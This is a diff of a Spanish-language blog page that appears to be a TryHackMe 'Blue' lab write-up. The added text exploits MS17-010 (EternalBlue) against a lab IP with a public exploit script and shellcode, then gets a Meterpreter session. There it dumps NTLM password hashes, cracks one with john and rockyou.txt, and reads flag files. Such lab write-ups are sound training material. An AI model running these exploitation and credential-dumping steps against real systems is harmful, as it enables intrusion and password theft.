@@ -366,8 +366,11 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 </code></pre></div></div>
 
 <blockquote>
-  <p>How many ports are open with a port number under 1000?
-3</p>
+  <p>How many ports are open with a port number under 1000?</p>
+</blockquote>
+
+<blockquote>
+  <p>3</p>
 </blockquote>
 
 <p>vemos el resultado del escaneo anterior con la utilidad <em>extractPors</em> y esta nos copia los puertos en la clipboard</p>
@@ -386,9 +389,121 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 
 <blockquote>
   <p>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</p>
-
 </blockquote>
 
+<blockquote>
+  <p>ms17-010</p>
+</blockquote>
+
+<p>ahora ya sabemos que es vulnerable a <em>ethernalblue</em>, buscamos un exploit manual en <em>google</em></p>
+
+<p><img src="/assets/images/blue/manual.png" alt="exploit manual" /></p>
+
+<p>procedemos a instalar la utilidad</p>
+
+<ul>
+  <li>comandos</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
+</code></pre></div></div>
+
+<p>el <em>script</em> tiene una utilidad que nos confirma que la maquina es vulnerable a <em>ethernalblue</em></p>
+
+<pre><code class="language-bas">❯ python3 eternal_checker.py 10.10.125.134
+[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done
+</code></pre>
+
+<p>Como vemos, la maquina no esta parchada contra esta vulnerabilidad, procedemos a explotarla
+nos novemos al directorio <em>shellcode</em> como indicaa la “guia” del <em>scritp</em></p>
+
+<p><img src="/assets/images/blue/shell_code.png" alt="configuracion scrit" /></p>
+
+<ul>
+  <li>ejecutamos con la configuración anterior</li>
+  <li>toca ejecutar el comando varias veces puesto que, se bloquea la maquina y/o problemas de <em>eternalblue</em> (algo común)</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python eternalblue_exploit7.py 10.10.125.134 shellcode/sc_all.bin
+shellcode size: 2205
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>en otra consola ponemos nuestra ejecutamos el comando <em>listener_prep.sh</em></p>
+
+<h1 id="hashdump">hashdump</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run post/windows/gather/hashdump
+
+<span class="o">[!]</span> SESSION may not be compatible with this module:
+<span class="o">[!]</span>  <span class="k">*</span> missing Meterpreter features: stdapi_sys_process_set_term_size
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Obtaining the boot key...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Obtaining the user list and keys...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Decrypting user keys...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping password hints...
+
+Jon:<span class="s2">"Nah boi, I ain't sharing nutting with you"</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</code></pre></div></div>
+
+<p>ahora vamos a intentar crackear cada contraseña con el diccionario <em>rockyou.txt</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john /home/blanco/Desktop/thm/blue/content/users.txt <span class="nt">--wordlist</span><span class="o">=</span>/home/blanco/Desktop/thm/rockyou.txt <span class="nt">--format</span><span class="o">=</span>NT
+
+alqfna22	<span class="o">(</span>jon<span class="o">)</span>
+</code></pre></div></div>
+
+<p>ahora a buscar la flag, para ello debemos regresar a la raiz del sistema y leer la primer bandera</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> <span class="nb">pwd
+</span>C:<span class="se">\W</span>indows
+meterpreter <span class="o">&gt;</span> <span class="nb">cd</span> ..
+meterpreter <span class="o">&gt;</span> <span class="nb">pwd
+</span>C:<span class="se">\</span>
+meterpreter <span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: C:<span class="se">\</span>
+<span class="o">============</span>
+
+Mode              Size   Type  Last modified              Name
+<span class="nt">----</span>              <span class="nt">----</span>   <span class="nt">----</span>  <span class="nt">-------------</span>              <span class="nt">----</span>
+40777/rwxrwxrwx   0      <span class="nb">dir   </span>2009-07-13 22:18:56 <span class="nt">-0500</span>  <span class="nv">$Recycle</span>.Bin
+40777/rwxrwxrwx   0      <span class="nb">dir   </span>2009-07-14 00:08:56 <span class="nt">-0500</span>  Documents and Settings
+40777/rwxrwxrwx   0      <span class="nb">dir   </span>2009-07-13 22:20:08 <span class="nt">-0500</span>  PerfLogs
+40555/r-xr-xr-x   4096   <span class="nb">dir   </span>2009-07-13 22:20:08 <span class="nt">-0500</span>  Program Files
+40555/r-xr-xr-x   4096   <span class="nb">dir   </span>2009-07-13 22:20:08 <span class="nt">-0500</span>  Program Files <span class="o">(</span>x86<span class="o">)</span>
+40777/rwxrwxrwx   4096   <span class="nb">dir   </span>2009-07-13 22:20:08 <span class="nt">-0500</span>  ProgramData
+40777/rwxrwxrwx   0      <span class="nb">dir   </span>2018-12-12 22:13:22 <span class="nt">-0500</span>  Recovery
+40777/rwxrwxrwx   4096   <span class="nb">dir   </span>2018-12-12 18:01:17 <span class="nt">-0500</span>  System Volume Information
+40555/r-xr-xr-x   4096   <span class="nb">dir   </span>2009-07-13 22:20:08 <span class="nt">-0500</span>  Users
+40777/rwxrwxrwx   16384  <span class="nb">dir   </span>2009-07-13 22:20:08 <span class="nt">-0500</span>  Windows
+100666/rw-rw-rw-  24     fil   2018-12-12 22:47:39 <span class="nt">-0500</span>  flag1.txt
+0000/---------    0      fif   1969-12-31 19:00:00 <span class="nt">-0500</span>  hiberfil.sys
+0000/---------    0      fif   1969-12-31 19:00:00 <span class="nt">-0500</span>  pagefile.sys
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cat </span>flag1.txt
+xxxx<span class="o">{</span>xxcxsx_txe_mxcxixx<span class="o">}</span>
+</code></pre></div></div>
+
+<p>para encontrar la 2da flag y no hacerlo manualmente usamos el comando</p>
+
+<blockquote>
+  <p>dir flag /s /p</p>
+</blockquote>
 
         
       </section>
@@ -454,7 +569,7 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 ">Previous</a>
     
     
-      <a href="/Walking-An-Application/" class="pagination--pager" title="Walking An Application
+      <a href="/LFI/" class="pagination--pager" title="tryhackme: LFI
 ">Next</a>
     
   </nav>
